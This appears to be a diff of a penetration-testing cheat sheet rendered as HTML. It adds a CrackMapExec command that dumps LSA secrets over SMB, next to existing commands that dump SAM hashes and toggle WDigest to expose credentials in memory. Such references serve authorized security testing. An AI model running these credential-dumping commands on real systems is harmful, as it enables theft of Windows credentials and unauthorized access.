@@ -146,6 +146,9 @@ cme smb 192.168.10.11 <span class="nt">-u</span> Administrator <span class="nt">
 <div class="highlight"><pre class="highlight shell"><code><span class="c"># dump local SAM hashes</span>
 cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">--local-auth</span> <span class="nt">--sam</span>
 
+<span class="c"># dump LSA secrets</span>
+cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">--local-auth</span> <span class="nt">--lsa</span>
+
 <span class="c"># enable or disable wdigest to get credentials from the LSA memory</span>
 cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">--local-auth</span> <span class="nt">--wdigest</span> <span class="nb">enable
 </span>cme smb 192.168.215.104 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">--local-auth</span> <span class="nt">--wdigest</span> disable
